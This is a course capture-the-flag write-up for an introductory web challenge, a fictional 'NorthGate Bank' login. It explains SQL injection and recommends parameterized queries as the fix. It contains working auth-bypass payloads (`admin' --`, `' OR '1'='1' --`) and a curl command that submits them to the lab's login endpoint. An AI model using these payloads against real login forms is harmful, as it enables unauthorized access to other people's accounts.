---
platform: course
class: 1
target: northgate-bank
category: web
difficulty: introductory
access: "https://<course-host>/"
tags: [web, sql-injection, sqli, auth-bypass, owasp-top-10, injection]
technique: sql-injection
date: 2026-09-10
---

# NorthGate Bank

**Class:** 1 (Intro) · **Category:** Web · **Level:** Introductory

NorthGate Bank's online banking is up. The login page offers a demo account
(`guest` / `guest123`), but the interesting thing is in the **admin** account.
The goal is to log in as `admin`.

## Recon

The demo account works and shows a boring standard dashboard —
"Nothing interesting here." The task says the good stuff is in the admin
account, so the objective is clear: become `admin`.

Guessing the admin password is a dead end (`admin` / anything → "Invalid
username or password"). If it were a password-guessing challenge it would be
brute force, not web. The interesting question is: **what does the server do
with what we type?**

## The vulnerability — SQL injection

A login usually checks credentials with a query built from the input:

```sql
SELECT * FROM users WHERE username = 'INPUT' AND password = 'INPUT'
```

Text values sit between single quotes. That quote marks where the data starts
and ends — so what happens if our input *contains* a quote? It stops being data
and becomes part of the query.

## Exploitation — auth bypass

Put this in the **username** field (any password):

```
admin' --
```

The query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'x'
```

- `admin'` closes the username string early.
- `--` starts a SQL comment: everything after it on the line is ignored.
- `' AND password = 'x'` is now inside that comment — never executed.

So the query that actually runs is `SELECT * FROM users WHERE username =
'admin'`. The password check is gone; the database returns admin's row and the
server hands us the session.

```bash
curl -s -c cookies.txt -X POST \
  --data-urlencode "username=admin' --" \
  --data-urlencode "password=x" \
  https://<course-host>/login -o /dev/null -w "%{http_code} -> %{redirect_url}\n"
# 302 -> /dashboard
```

The admin dashboard then shows the flag in its notes. In the browser it is the
same: type `admin' --` as the username and anything as the password.

> A payload like `' OR '1'='1' --` also works: it makes the condition always
> true, so the database returns the first row and you log in as whoever that is.
> Trying variants is part of the job — different apps build the query
> differently.

## Flag

```
FaMAF{ ...redacted... }
```

Redacted — see [course notes](../README.md). Decoded intent: *SQL injection
bypasses auth*.

## Technique

Full, source-backed write-up:
[SQL injection](../../notes/web-security/sql-injection.md).

## Lessons learned

- When input is concatenated into a query, a single quote lets you break out of
  data and write SQL. That is the whole bug.
- `--` comments out the rest of the query (like the password check); `OR
  '1'='1'` forces a true condition.
- The fix is **parameterized queries**: the database gets the query and the
  values separately and always treats input as data.
- Same shape recurs whenever untrusted input meets a language (SQL, HTML,
  shell): can the input escape its slot and become instructions?
